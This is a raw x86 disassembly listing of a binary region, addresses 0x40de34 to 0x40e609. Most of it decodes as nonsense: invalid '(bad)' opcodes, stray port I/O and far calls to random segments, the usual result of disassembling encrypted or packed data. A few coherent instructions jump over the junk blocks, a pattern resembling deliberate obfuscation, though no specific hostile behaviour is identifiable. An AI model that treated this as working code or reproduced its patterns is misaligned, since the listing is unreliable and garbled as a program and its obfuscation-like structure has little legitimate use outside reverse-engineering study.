  40de34:	call   0x955c:0x8cce14d5
  40de3b:	clc    
  40de3c:	(bad)  
  40de3d:	pop    eax
  40de3e:	ja     0x40dde2
  40de40:	sub    edi,ebx
  40de42:	ss push eax
  40de44:	xor    ecx,DWORD PTR [eax+edx*8+0x68]
  40de48:	pop    edi
  40de49:	push   ss
  40de4a:	sti    
  40de4b:	cmp    al,0xea
  40de4d:	push   ecx
  40de4e:	nop
  40de4f:	fwait
  40de50:	iret   
  40de51:	arpl   WORD PTR [edi],si
  40de53:	fwait
  40de54:	arpl   WORD PTR [ebp-0x5a929ce8],dx
  40de5a:	mov    ah,0xbc
  40de5c:	adc    al,0x31
  40de5e:	mov    esi,cs
  40de60:	inc    esp
  40de61:	lods   al,BYTE PTR ds:[esi]
  40de62:	mul    DWORD PTR [ebx-0x29d2721e]
  40de68:	jl     0x40de37
  40de6a:	sub    eax,0x9b60f3cc
  40de6f:	jge    0x40dee3
  40de71:	pop    edi
  40de72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de73:	xor    DWORD PTR [eax],0xce3f4873
  40de79:	lods   al,BYTE PTR ds:[esi]
  40de7a:	push   esi
  40de7b:	es retf 0x16ca
  40de7f:	mov    ds:0x4e9c63cb,al
  40de84:	cmp    al,0xf
  40de86:	add    ebx,ecx
  40de88:	retf   0xd504
  40de8b:	stos   BYTE PTR es:[edi],al
  40de8c:	push   ecx
  40de8d:	xchg   edi,eax
  40de8e:	mov    ch,0xd3
  40de90:	xlat   BYTE PTR ds:[ebx]
  40de91:	push   esp
  40de92:	xor    al,0x90
  40de94:	test   eax,0x1e177ee7
  40de99:	int    0xeb
  40de9b:	aam    0xad
  40de9d:	les    ebp,FWORD PTR [ebx-0x4c90a2f4]
  40dea3:	xchg   ecx,ebp
  40dea5:	test   eax,0x9b8b819
  40deaa:	inc    esi
  40deab:	jb     0x40de79
  40dead:	dec    ebx
  40deae:	shl    ch,cl
  40deb0:	ss sub al,0xc2
  40deb3:	inc    edx
  40deb4:	xor    al,0x2c
  40deb6:	ror    BYTE PTR [edx+0x64],cl
  40deb9:	inc    esi
  40deba:	shl    dh,cl
  40debc:	pop    edi
  40debd:	pop    esi
  40debe:	xor    al,0x32
  40dec0:	adc    BYTE PTR [edx+0x67c23d7d],al
  40dec6:	enter  0x12db,0x31
  40deca:	pop    edx
  40decb:	mov    esi,0xd20705ad
  40ded0:	adc    BYTE PTR [ebx],dh
  40ded2:	pop    esi
  40ded3:	xchg   dh,al
  40ded5:	xchg   BYTE PTR [edx+0x2cf81f88],bl
  40dedb:	nop
  40dedc:	inc    esi
  40dedd:	sbb    al,0x76
  40dedf:	aad    0xbd
  40dee1:	mov    ds:0x263695ae,al
  40dee6:	dec    eax
  40dee7:	cs ret 0x998
  40deeb:	xchg   esp,eax
  40deec:	jb     0x40de7a
  40deee:	add    al,0xbe
  40def0:	rcr    DWORD PTR [ebx+esi*1-0x6b],0x8f
  40def5:	sbb    al,0x78
  40def7:	fldenv [ebp-0x573b1ab9]
  40defd:	rcl    BYTE PTR [esi],cl
  40deff:	fisttp DWORD PTR [ebx-0x10]
  40df02:	pusha  
  40df03:	adc    BYTE PTR [ebp-0xe],ch
  40df06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df07:	inc    ebx
  40df08:	in     al,dx
  40df09:	cmp    edi,edi
  40df0b:	aaa    
  40df0c:	idiv   DWORD PTR [edi+0xf]
  40df0f:	jne    0x40df17
  40df11:	repnz dec eax
  40df13:	mov    ah,0x1f
  40df15:	mov    al,ds:0x83d4c9f5
  40df1a:	xchg   ebx,eax
  40df1b:	out    0x3,eax
  40df1d:	shr    BYTE PTR [ecx+0x56f0629a],0xc4
  40df24:	cmp    BYTE PTR [edi-0x49],dl
  40df27:	cmp    al,0x75
  40df29:	repz jnp 0x40df10
  40df2c:	(bad)  [edx-0x61de88ea]
  40df32:	cmp    DWORD PTR ds:0x201acbb0,0xa8c9f0fc
  40df3c:	ror    edi,1
  40df3e:	in     al,0xca
  40df40:	push   esi
  40df41:	daa    
  40df42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df43:	lods   al,BYTE PTR ds:[esi]
  40df44:	mov    al,ds:0xc6b09c8
  40df49:	jb     0x40dfa8
  40df4b:	inc    edi
  40df4c:	mov    eax,0xf3f8d3f4
  40df51:	mov    bh,0x6a
  40df53:	dec    eax
  40df54:	add    eax,0x8dc94151
  40df59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df5a:	jo     0x40df41
  40df5c:	push   esp
  40df5d:	cmp    BYTE PTR [edx+0x3d],dl
  40df60:	push   ebp
  40df61:	mov    cs,WORD PTR [esi+0x5f1b232b]
  40df67:	pop    edi
  40df68:	jno    0x40df0e
  40df6a:	(bad)  
  40df6b:	push   esp
  40df6c:	mov    ecx,0x1818bedf
  40df71:	push   esi
  40df72:	pop    esi
  40df73:	jns    0x40dfee
  40df75:	dec    ebx
  40df76:	pop    eax
  40df77:	xor    DWORD PTR ds:0xc42e8417,ebp
  40df7d:	rcl    BYTE PTR ds:0x811b5ed5,0xfb
  40df84:	mov    WORD PTR [esi-0x46],?
  40df87:	neg    BYTE PTR [edx]
  40df89:	cmp    al,0x70
  40df8b:	rol    BYTE PTR [eax-0x23],0x94
  40df8f:	and    BYTE PTR [esi],ch
  40df91:	push   edi
  40df92:	(bad)  
  40df93:	jb     0x40dfac
  40df95:	lods   eax,DWORD PTR ds:[esi]
  40df96:	jmp    0x60e8:0x6cfb8a0f
  40df9d:	mov    WORD PTR [esi],ss
  40df9f:	push   es
  40dfa0:	repz (bad) 
  40dfa2:	leave  
  40dfa3:	mov    ds:0x71f3f1ee,al
  40dfa8:	push   DWORD PTR [esi]
  40dfaa:	add    eax,ebx
  40dfac:	mov    DWORD PTR [ebp-0x54],eax
  40dfaf:	not    DWORD PTR ds:0x42a859
  40dfb5:	lea    eax,[ebp-0x1c]
  40dfb8:	mov    DWORD PTR [ebp-0x50],eax
  40dfbb:	mov    eax,DWORD PTR [ebp-0x60]
  40dfbe:	xor    eax,esi
  40dfc0:	add    eax,ebx
  40dfc2:	mov    DWORD PTR [ebp-0x60],eax
  40dfc5:	lea    eax,[ebp-0x60]
  40dfc8:	push   eax
  40dfc9:	mov    eax,DWORD PTR [ebp+0xc]
  40dfcc:	jmp    0x40e224
  40dfd1:	ds cmp eax,0xd1d1d2d2
  40dfd7:	rol    DWORD PTR ds:[ecx-0x67bfbec6],1
  40dfde:	(bad)  
  40dfdf:	jmp    0x3578:0x78b28897
  40dfe6:	jle    0x40e060
  40dfe8:	js     0x40dfd7
  40dfea:	jge    0x40dff1
  40dfec:	and    ecx,ebx
  40dfee:	out    dx,al
  40dfef:	or     BYTE PTR [edx+0x6b2b09b0],ch
  40dff5:	idiv   DWORD PTR [edx+0x1a]
  40dff8:	lods   eax,DWORD PTR ds:[esi]
  40dff9:	(bad)  
  40dffa:	bound  edi,QWORD PTR [ebp+0x7933936c]
  40e000:	je     0x40e05b
  40e002:	add    al,0x3c
  40e004:	int3   
  40e005:	push   ds
  40e006:	jge    0x40dfba
  40e008:	and    DWORD PTR [esi-0x4c],edi
  40e00b:	and    eax,0x6557b90f
  40e010:	sub    BYTE PTR [ebx-0x20989824],al
  40e016:	ins    DWORD PTR es:[edi],dx
  40e017:	mov    esp,0x7c72c2cb
  40e01c:	pop    si
  40e01e:	sub    dl,BYTE PTR [ebp-0x56]
  40e021:	mov    DWORD PTR [esi+0x1c],edi
  40e024:	pop    DWORD PTR [esi+0x4d7e9c3f]
  40e02a:	retf   0xcaf9
  40e02d:	xor    BYTE PTR [ecx+0x7a],cl
  40e030:	cmp    ebp,edi
  40e032:	rcr    edx,cl
  40e034:	ja     0x40e017
  40e036:	mov    ebx,0xb1addfd2
  40e03b:	inc    esi
  40e03c:	div    DWORD PTR [esi+0x3e]
  40e03f:	test   eax,0xb9a2529
  40e044:	mov    ah,0xf9
  40e046:	sti    
  40e047:	repnz xor eax,0x1288fc5
  40e04d:	add    ebx,ebx
  40e04f:	mov    eax,ds:0x8799a5fb
  40e054:	js     0x40e047
  40e056:	and    eax,DWORD PTR [ecx]
  40e058:	xor    DWORD PTR cs:[ebx],eax
  40e05b:	bound  bp,DWORD PTR [edx]
  40e05e:	out    dx,eax
  40e05f:	push   esp
  40e060:	pop    ebx
  40e061:	sbb    eax,0xf47632cb
  40e066:	xchg   edi,eax
  40e067:	mov    bl,0x3
  40e069:	mov    ah,0x5
  40e06b:	scas   al,BYTE PTR es:[edi]
  40e06c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e06d:	and    eax,0x89690813
  40e072:	xchg   edx,eax
  40e073:	scas   al,BYTE PTR es:[edi]
  40e074:	fisub  DWORD PTR [ebp-0x6b]
  40e077:	dec    ecx
  40e078:	and    eax,0x7fb562f5
  40e07d:	mov    ebp,0x93b97938
  40e082:	sub    al,0x87
  40e084:	add    dh,BYTE PTR [edi+edi*1-0x5cc8fe9d]
  40e08b:	or     eax,0xc08396b9
  40e090:	js     0x40e10d
  40e092:	and    BYTE PTR [edi],0x3a
  40e095:	movaps xmm3,XMMWORD PTR ds:[eax]
  40e099:	or     eax,0xb8f91411
  40e09e:	pop    esi
  40e09f:	or     dh,BYTE PTR [edx]
  40e0a1:	mov    ah,0x80
  40e0a3:	jo     0x40e109
  40e0a5:	and    esi,esi
  40e0a7:	cli    
  40e0a8:	or     ebp,DWORD PTR [esi+0x61]
  40e0ab:	fldcw  WORD PTR [edx+0x32]
  40e0ae:	aad    0xc8
  40e0b0:	jle    0x40e0f0
  40e0b2:	mov    eax,0xdbc2b71
  40e0b7:	and    edi,DWORD PTR [ebx]
  40e0b9:	and    al,0xed
  40e0bb:	fcom   QWORD PTR [ebp+0x4c82ef63]
  40e0c1:	ss ffree st(6)
  40e0c4:	enter  0x6ab5,0x15
  40e0c8:	in     eax,0xe5
  40e0ca:	xchg   ebx,eax
  40e0cb:	jno    0x40e063
  40e0cd:	call   0x84a5:0x68c722e
  40e0d4:	fsub   QWORD PTR [ebx+0x6]
  40e0d7:	mov    dl,0x5e
  40e0d9:	neg    DWORD PTR [esi-0x73]
  40e0dc:	sbb    DWORD PTR [edi+0x21],edi
  40e0df:	mul    BYTE PTR [ecx+0x7e]
  40e0e2:	mov    ah,0x45
  40e0e4:	add    BYTE PTR [edi-0x4aa0159d],bl
  40e0ea:	shl    BYTE PTR [ecx+0x2],cl
  40e0ed:	inc    DWORD PTR [esi-0x1a2ed7b2]
  40e0f3:	jle    0x40e0d4
  40e0f5:	call   0x50e9:0xefb9ee45
  40e0fc:	out    dx,al
  40e0fd:	sbb    DWORD PTR [eax-0x614eabea],edi
  40e103:	xchg   BYTE PTR [esi],dh
  40e105:	dec    ebp
  40e106:	sub    esi,ebx
  40e108:	jns    0x40e13a
  40e10a:	jg     0x40e101
  40e10c:	into   
  40e10d:	dec    ebx
  40e10e:	or     edx,ebx
  40e110:	jne    0x40e09e
  40e112:	pop    esi
  40e113:	lock fwait
  40e115:	mov    al,ds:0xd78c317
  40e11a:	mov    edi,esp
  40e11c:	mov    eax,ds:0x87d83c48
  40e121:	pusha  
  40e122:	mov    DWORD PTR [ecx-0x10],0xcfb01de5
  40e129:	or     BYTE PTR [eax-0x48f70629],0x30
  40e130:	mov    edi,0x3ddf1bd3
  40e135:	out    0xd0,al
  40e137:	inc    esi
  40e138:	pop    ecx
  40e139:	rcr    ebx,cl
  40e13b:	ffree  st(5)
  40e13d:	sti    
  40e13e:	mov    esp,0x43ccfd83
  40e143:	fimul  DWORD PTR [ebx-0x34]
  40e146:	sub    BYTE PTR [ebx+0x369fcfc],bl
  40e14c:	inc    ebx
  40e14d:	ret    0x8d2a
  40e150:	xchg   edi,eax
  40e151:	ffree  st(5)
  40e153:	and    eax,0x231b3b3f
  40e158:	cmp    BYTE PTR [esp+ebx*8+0x346f7f70],0xd
  40e160:	mov    esi,0xc6d39aa3
  40e165:	jg     0x40e168
  40e167:	push   0x8676d6b4
  40e16c:	push   ebx
  40e16d:	jnp    0x40e1ee
  40e16f:	scas   eax,DWORD PTR es:[edi]
  40e170:	lea    ebx,[ebx-0x672f9d52]
  40e176:	jae    0x40e15e
  40e178:	mov    esp,DWORD PTR [esp+ecx*4-0x781d5c6a]
  40e17f:	pop    ss
  40e180:	into   
  40e181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e182:	adc    esi,esi
  40e184:	test   al,0xf0
  40e186:	mov    ch,0xad
  40e188:	push   ebx
  40e189:	in     eax,0xc4
  40e18b:	(bad)  
  40e18c:	mov    al,ds:0xb5240c87
  40e191:	jb     0x40e146
  40e193:	and    DWORD PTR [edx+0x50b592b],ecx
  40e199:	add    DWORD PTR [ecx-0x5e],edi
  40e19c:	int3   
  40e19d:	pop    ebp
  40e19e:	mov    edx,0xd2a08780
  40e1a3:	sub    eax,0x57ea14cc
  40e1a8:	adc    ecx,DWORD PTR [eax+0x5b]
  40e1ab:	xchg   ebx,eax
  40e1ac:	and    esi,DWORD PTR [ecx-0x11ac8c6e]
  40e1b2:	call   0xb638:0xd93ecc5b
  40e1b9:	sub    al,0x36
  40e1bb:	jno    0x40e18d
  40e1bd:	mov    dh,0xfb
  40e1bf:	sub    al,ch
  40e1c1:	icebp  
  40e1c2:	xlat   BYTE PTR ds:[ebx]
  40e1c3:	mov    ecx,fs
  40e1c5:	cmp    al,0x85
  40e1c7:	inc    eax
  40e1c8:	cmp    dl,0x24
  40e1cb:	jmp    0x7a91:0xe535f36b
  40e1d2:	adc    BYTE PTR [ebx-0x6dbb0782],al
  40e1d8:	nop
  40e1d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1da:	gs adc esi,edi
  40e1dd:	rcl    BYTE PTR [edx+0x52],cl
  40e1e0:	stos   BYTE PTR es:[edi],al
  40e1e1:	and    al,0xb1
  40e1e3:	sub    al,0x34
  40e1e5:	lahf   
  40e1e6:	xor    eax,0xf936b74
  40e1eb:	or     ah,al
  40e1ed:	ss add al,0x8a
  40e1f0:	xor    DWORD PTR [eax+0x49bf6bbd],eax
  40e1f6:	scas   al,BYTE PTR es:[edi]
  40e1f7:	or     DWORD PTR [ecx],eax
  40e1f9:	int    0xf5
  40e1fb:	test   DWORD PTR ds:0xcdd99806,edi
  40e201:	pop    ebx
  40e202:	push   es
  40e203:	mov    edi,0x880c9a99
  40e208:	call   FWORD PTR [ebx+0x66]
  40e20b:	or     bh,BYTE PTR [edi]
  40e20d:	lock (bad) 
  40e20f:	pop    edx
  40e210:	fmul   DWORD PTR [edi+0x18cc2e3c]
  40e216:	neg    cl
  40e218:	push   0x17290f35
  40e21d:	(bad)  
  40e21e:	add    bl,BYTE PTR [ebp+0x3ce28222]
  40e224:	xor    eax,esi
  40e226:	add    eax,ebx
  40e228:	push   eax
  40e229:	jmp    0x40e481
  40e22e:	(bad)  
  40e22f:	xlat   BYTE PTR ds:[ebx]
  40e230:	(bad)  
  40e231:	retf   0xc9d5
  40e234:	fcmovu st,st(3)
  40e236:	aas    
  40e237:	cmp    al,0x7f
  40e239:	push   es
  40e23a:	sbb    DWORD PTR [esi+0x23],ebx
  40e23d:	and    eax,0x7878b045
  40e242:	xor    eax,0x4678787e
  40e247:	loopne 0x40e24d
  40e249:	enter  0x83f5,0x45
  40e24d:	mov    ss,ecx
  40e24f:	sahf   
  40e250:	outs   dx,BYTE PTR ds:[esi]
  40e251:	sti    
  40e252:	pop    edi
  40e253:	ret    0xaf97
  40e256:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e257:	paddusw mm1,mm6
  40e25a:	int    0x17
  40e25c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e25d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e25e:	lea    ebp,[ecx]
  40e260:	xchg   BYTE PTR [edx-0x696b0bbc],ah
  40e266:	test   eax,0xfa134685
  40e26b:	adc    esi,esp
  40e26d:	and    DWORD PTR [edi-0xde99b94],esi
  40e273:	loopne 0x40e2d9
  40e275:	lea    ebp,[ebx-0x73]
  40e278:	push   ds
  40e279:	jmp    0x40e248
  40e27b:	ja     0x40e2ba
  40e27d:	dec    edx
  40e27e:	jl     0x40e287
  40e280:	or     eax,0xd07a9f21
  40e285:	fidiv  DWORD PTR [eax+0x7]
  40e288:	dec    ebx
  40e289:	and    edx,ebx
  40e28b:	test   ah,dl
  40e28d:	sub    dh,BYTE PTR [edx+0x52]
  40e290:	sbb    edx,DWORD PTR [esi-0x21eaa909]
  40e296:	cwde   
  40e297:	cmp    ebx,ebx
  40e299:	cs inc eax
  40e29b:	rcr    BYTE PTR [esi-0x55],0x82
  40e29f:	mov    esi,0x5225b9e3
  40e2a4:	dec    esi
  40e2a5:	in     al,0x6
  40e2a7:	clc    
  40e2a8:	dec    ebx
  40e2a9:	scas   al,BYTE PTR es:[edi]
  40e2aa:	inc    ebp
  40e2ab:	mov    edx,0x5bdcbd68
  40e2b0:	enter  0x7329,0x82
  40e2b4:	xchg   edi,eax
  40e2b5:	mov    edx,0xdcb58d31
  40e2ba:	push   edx
  40e2bb:	xchg   edx,eax
  40e2bc:	popa   
  40e2bd:	test   al,0x5
  40e2bf:	data16 xchg BYTE PTR [edx],bh
  40e2c2:	mov    edi,0x82dd2d85
  40e2c7:	xor    eax,DWORD PTR [esi+0x33]
  40e2ca:	push   ebx
  40e2cb:	cmp    dl,bh
  40e2cd:	test   eax,0x43c73510
  40e2d2:	(bad)  
  40e2d3:	mov    BYTE PTR [ebp-0x621d1ef2],bh
  40e2d9:	xor    edx,DWORD PTR [edx-0x4a]
  40e2dc:	outs   dx,BYTE PTR ds:[esi]
  40e2dd:	xchg   esi,eax
  40e2de:	xchg   esi,eax
  40e2df:	xor    al,0xac
  40e2e1:	cwde   
  40e2e2:	add    al,0x55
  40e2e4:	push   ebx
  40e2e5:	cmc    
  40e2e6:	cli    
  40e2e7:	sar    BYTE PTR [edi],1
  40e2e9:	pop    ss
  40e2ea:	adc    al,0x88
  40e2ec:	push   esi
  40e2ed:	sahf   
  40e2ee:	inc    eax
  40e2ef:	sub    BYTE PTR [edi+0x57],ah
  40e2f2:	jmp    0x40e27b
  40e2f4:	sbb    bl,BYTE PTR [ecx-0x389f7328]
  40e2fa:	fdivr  DWORD PTR [esi-0x49]
  40e2fd:	dec    edx
  40e2fe:	xor    WORD PTR [ecx],sp
  40e301:	sbb    DWORD PTR [edi-0x61],ecx
  40e304:	xor    al,0x67
  40e306:	mov    ds:0x64b897ff,eax
  40e30b:	pop    edi
  40e30c:	inc    esi
  40e30d:	out    0xe2,eax
  40e30f:	mov    cl,0xe6
  40e311:	loopne 0x40e385
  40e313:	push   cs
  40e314:	dec    ebx
  40e315:	(bad)  
  40e316:	call   0x8a358ccd
  40e31b:	or     ebx,DWORD PTR [edx-0x49]
  40e31e:	lea    ebx,[edi+0x6e]
  40e321:	fs popa 
  40e323:	ja     0x40e363
  40e325:	cli    
  40e326:	pop    edi
  40e327:	pop    ebp
  40e328:	test   DWORD PTR [eax-0x5],ebp
  40e32b:	(bad)
  40e32f:	xchg   edx,eax
  40e330:	cmp    ecx,DWORD PTR [esi+0x7475ebdc]
  40e336:	ja     0x40e3ab
  40e338:	pop    esp
  40e339:	gs and eax,0xc2760520
  40e33f:	add    eax,0x28385be3
  40e344:	mov    dh,0x91
  40e346:	popf   
  40e347:	dec    ebx
  40e348:	(bad)  
  40e349:	push   ebx
  40e34a:	stc    
  40e34b:	xor    bl,bl
  40e34d:	mov    eax,0x4a5c7ee2
  40e352:	gs iret 
  40e354:	int    0x68
  40e356:	sbb    eax,0x46e39396
  40e35b:	sti    
  40e35c:	mov    edx,DWORD PTR [eax+0x6f7b134d]
  40e362:	push   ds
  40e363:	or     bl,BYTE PTR [eax]
  40e365:	out    0xe7,eax
  40e367:	in     al,dx
  40e368:	mov    esp,0xbbb343b2
  40e36d:	cwde   
  40e36e:	cmp    ecx,DWORD PTR [edx-0x2e6e45c3]
  40e374:	int    0xa4
  40e376:	adc    eax,0x5708d5e0
  40e37b:	imul   ebp,esi,0x7e83c4f5
  40e381:	(bad)  
  40e382:	xchg   ebp,eax
  40e383:	or     dh,BYTE PTR [eax]
  40e385:	mov    ds:0x33265ad2,eax
  40e38a:	mov    bh,0xac
  40e38c:	lods   eax,DWORD PTR ds:[esi]
  40e38d:	ins    BYTE PTR es:[edi],dx
  40e38e:	(bad)  
  40e38f:	mov    edi,0x111ade67
  40e394:	inc    ecx
  40e395:	cmp    al,BYTE PTR [ecx]
  40e397:	imul   BYTE PTR [ebp+0x11bd70d4]
  40e39d:	push   0xffffff83
  40e39f:	mov    cl,0xf2
  40e3a1:	or     al,0x40
  40e3a3:	xor    dh,ch
  40e3a5:	xor    ebp,DWORD PTR [ebx]
  40e3a7:	adc    BYTE PTR [edi-0x735c4eac],0x99
  40e3ae:	jne    0x40e33a
  40e3b0:	cdq    
  40e3b1:	mov    DWORD PTR [edx-0x36],edx
  40e3b4:	int3   
  40e3b5:	imul   ebx,DWORD PTR [edi+0x1163acb2],0x3759370a
  40e3bf:	push   esp
  40e3c0:	dec    edx
  40e3c1:	adc    BYTE PTR [eax-0x6d46b824],ch
  40e3c7:	sbb    edx,0x48
  40e3ca:	adc    BYTE PTR [edi+0x73],ch
  40e3cd:	test   eax,0x12199ed4
  40e3d2:	rcl    DWORD PTR [edi+0x54c1a940],1
  40e3d8:	pop    esi
  40e3d9:	inc    edi
  40e3da:	sbb    al,0x8e
  40e3dc:	out    0xd4,al
  40e3de:	and    edi,edi
  40e3e0:	sbb    eax,0x8d0e72e3
  40e3e5:	jmp    0xd287:0x3246633
  40e3ec:	popf   
  40e3ed:	retf   0x3a84
  40e3f0:	adc    DWORD PTR [edx+0x49],0x11e440a0
  40e3f7:	inc    eax
  40e3f8:	test   eax,0x35a9c290
  40e3fd:	dec    edi
  40e3fe:	fild   QWORD PTR [edx+0x32c297a6]
  40e404:	ins    BYTE PTR es:[edi],dx
  40e405:	fimul  WORD PTR [ebx-0x13]
  40e408:	mov    ds:0x7e4f3cb8,al
  40e40d:	retf   0x7144
  40e410:	popa   
  40e411:	mov    ah,0xaa
  40e413:	and    al,BYTE PTR [eax+0x4]
  40e416:	sahf   
  40e417:	xchg   edx,eax
  40e418:	hlt    
  40e419:	push   cs
  40e41a:	sub    ah,dl
  40e41c:	retf   0x6dcd
  40e41f:	retf   0xcaa5
  40e422:	sub    eax,0xa5e5fff7
  40e427:	cld    
  40e428:	nop
  40e429:	lahf   
  40e42a:	cld    
  40e42b:	mov    DWORD PTR fs:[edx],0x9bdf6b43
  40e432:	mov    esp,0xdf369035
  40e437:	inc    ecx
  40e438:	fwait
  40e439:	xchg   ecx,eax
  40e43a:	aaa    
  40e43b:	ffree  st(2)
  40e43d:	repz cli 
  40e43f:	add    al,0xdb
  40e441:	dec    esp
  40e442:	inc    ecx
  40e443:	scas   eax,DWORD PTR es:[edi]
  40e444:	jle    0x40e3f0
  40e446:	outs   dx,BYTE PTR ds:[esi]
  40e447:	(bad)  
  40e448:	sbb    al,0x1a
  40e44a:	adc    dl,BYTE PTR [esi]
  40e44c:	imul   ebp,DWORD PTR [eax+0x7ca5e503],0xffffffbb
  40e453:	add    eax,0xcfd677e7
  40e458:	inc    ebx
  40e459:	ins    DWORD PTR es:[edi],dx
  40e45a:	call   0xff97:0xeb68d2bc
  40e461:	mov    WORD PTR [ebx],fs
  40e463:	inc    edx
  40e464:	jg     0x40e407
  40e466:	add    DWORD PTR [esp+eax*4+0x118da4b3],ebp
  40e46d:	dec    ecx
  40e46e:	stos   BYTE PTR es:[edi],al
  40e46f:	cmp    eax,0x915c8ef0
  40e474:	add    DWORD PTR [ebx+ebx*4+0x73],esi
  40e478:	pop    ebx
  40e479:	jge    0x40e49a
  40e47b:	xor    al,BYTE PTR [edx-0x110c87ca]
  40e481:	mov    eax,ds:0x41eb06
  40e486:	push   0x41ea5c
  40e48b:	push   DWORD PTR [eax]
  40e48d:	call   0x419198
  40e492:	jmp    0x40e979
  40e497:	cmp    edi,0x13c
  40e49d:	jne    0x40e979
  40e4a3:	mov    eax,DWORD PTR [ebp-0x10]
  40e4a6:	jmp    0x40e6fe
  40e4ab:	sar    DWORD PTR ds:[esi],0xca
  40e4af:	ror    ecx,0xca
  40e4b2:	leave  
  40e4b3:	(bad)  
  40e4b4:	dec    eax
  40e4b5:	cmc    
  40e4b6:	adc    edx,DWORD PTR [edi-0x6a]
  40e4b9:	jecxz  0x40e452
  40e4bb:	add    dh,BYTE PTR [ebp+0x7e357878]
  40e4c1:	js     0x40e53b
  40e4c3:	mov    WORD PTR [ebx-0x5f],ss
  40e4c6:	sbb    ch,dh
  40e4c8:	mov    eax,0xf1f56bb7
  40e4cd:	push   ebx
  40e4ce:	jle    0x40e4ea
  40e4d0:	cmp    al,0x35
  40e4d2:	in     al,dx
  40e4d3:	mov    ds:0x6725a9ba,al
  40e4d8:	fimul  DWORD PTR [eax-0x3b913b43]
  40e4de:	sub    esp,0xbc56e005
  40e4e4:	adc    BYTE PTR [eax-0x51],bl
  40e4e7:	pop    ebp
  40e4e8:	ja     0x40e486
  40e4ea:	aaa    
  40e4eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4ec:	dec    edi
  40e4ed:	aad    0x1d
  40e4ef:	sbb    BYTE PTR [edi-0x22],bl
  40e4f2:	daa    
  40e4f3:	(bad)
  40e4f7:	and    DWORD PTR [ecx-0x6c],esi
  40e4fa:	mov    al,ds:0xec437013
  40e4ff:	inc    ebp
  40e500:	mov    ds:0x64d33d9d,al
  40e505:	mov    ebx,0xb92d8c38
  40e50a:	ficomp DWORD PTR [edi+0x6499d40b]
  40e510:	out    dx,eax
  40e511:	or     dh,BYTE PTR [edi+0x3ae39e6b]
  40e517:	ins    DWORD PTR es:[edi],dx
  40e518:	rcl    DWORD PTR [ebp-0x69e4992],cl
  40e51e:	jg     0x40e561
  40e520:	mov    eax,ds:0x4e6a5c4d
  40e525:	ret    
  40e526:	scas   al,BYTE PTR es:[edi]
  40e527:	ror    BYTE PTR [edx-0x20],1
  40e52a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e52b:	pop    ebx
  40e52c:	aaa    
  40e52d:	adc    bh,BYTE PTR gs:[eax]
  40e530:	lea    eax,[edx-0x78db2b26]
  40e536:	loope  0x40e4c2
  40e538:	and    BYTE PTR [edi+esi*8+0x61],bl
  40e53c:	outs   dx,BYTE PTR ds:[esi]
  40e53d:	cmp    eax,0x6dbe8e2
  40e542:	mov    bl,0xad
  40e544:	(bad)  
  40e545:	loopne 0x40e549
  40e547:	xchg   edx,eax
  40e548:	shl    edx,0xda
  40e54b:	cmp    DWORD PTR [edi],0x482031b7
  40e551:	outs   dx,BYTE PTR ds:[esi]
  40e552:	sti    
  40e553:	(bad)  
  40e554:	(bad)  
  40e555:	sub    bh,BYTE PTR [ebp-0x8]
  40e558:	test   DWORD PTR [esi+0x622afe3],eax
  40e55e:	xchg   esp,eax
  40e55f:	leave  
  40e560:	jmp    0x2b2b792
  40e565:	fs xchg esi,eax
  40e567:	mov    ebx,0x84cfd900
  40e56c:	inc    BYTE PTR [esi]
  40e56e:	inc    edx
  40e56f:	ret    0x6ced
  40e572:	loopne 0x40e599
  40e574:	pop    ecx
  40e575:	clc    
  40e576:	inc    edx
  40e577:	mov    edx,0xb898d73
  40e57c:	ds adc eax,0x996ec814
  40e582:	jo     0x40e58b
  40e584:	add    ecx,DWORD PTR [edx]
  40e586:	mov    dl,0x3e
  40e588:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e589:	mov    ds:0xc119bb55,al
  40e58e:	outs   dx,BYTE PTR cs:[esi]
  40e590:	jl     0x40e5c9
  40e592:	aam    0xaa
  40e594:	jg     0x40e603
  40e596:	mov    edx,0x25ebcc68
  40e59b:	(bad)  
  40e59d:	std    
  40e59e:	push   edi
  40e59f:	cs leave 
  40e5a1:	sbb    DWORD PTR [ebx+0x3240abb9],0xffffff94
  40e5a8:	jb     0x40e5ee
  40e5aa:	loopne 0x40e551
  40e5ac:	jmp    0x40e607
  40e5ae:	mov    bh,0xf0
  40e5b0:	xor    al,BYTE PTR [ebp+0x6754ccd7]
  40e5b6:	iret   
  40e5b7:	gs dec esi
  40e5b9:	repnz shl edx,0xe9
  40e5bd:	push   ss
  40e5be:	inc    ebx
  40e5bf:	addr16 int 0x60
  40e5c2:	aas    
  40e5c3:	ins    BYTE PTR es:[edi],dx
  40e5c4:	fisttp WORD PTR [edi]
  40e5c6:	lock adc al,0x55
  40e5c9:	retf   
  40e5ca:	jecxz  0x40e628
  40e5cc:	mov    WORD PTR [eax],ss
  40e5ce:	sub    DWORD PTR [ecx],eax
  40e5d0:	out    dx,eax
  40e5d1:	enter  0x6786,0x42
  40e5d5:	ret    
  40e5d6:	stos   DWORD PTR es:[edi],eax
  40e5d7:	push   edi
  40e5d8:	call   0x44c:0xfcfc31c9
  40e5df:	adc    BYTE PTR [eax+0x6c784cfb],bl
  40e5e5:	push   es
  40e5e6:	fcomp  st(6)
  40e5e8:	loope  0x40e598
  40e5ea:	inc    ecx
  40e5eb:	mov    esp,0x2779cce9
  40e5f0:	cmc    
  40e5f1:	xor    esi,DWORD PTR [eax-0x34]
  40e5f4:	mov    al,ds:0xd434125b
  40e5f9:	sbb    al,0x54
  40e5fb:	dec    edi
  40e5fc:	test   ah,0x9
  40e5ff:	dec    edx
  40e600:	ret    
  40e601:	icebp  
  40e602:	jge    0x40e65f
  40e604:	js     0x40e5ee
  40e606:	(bad)  
  40e607:	loop   0x40e603
  40e609:	xchg   ebp,eax
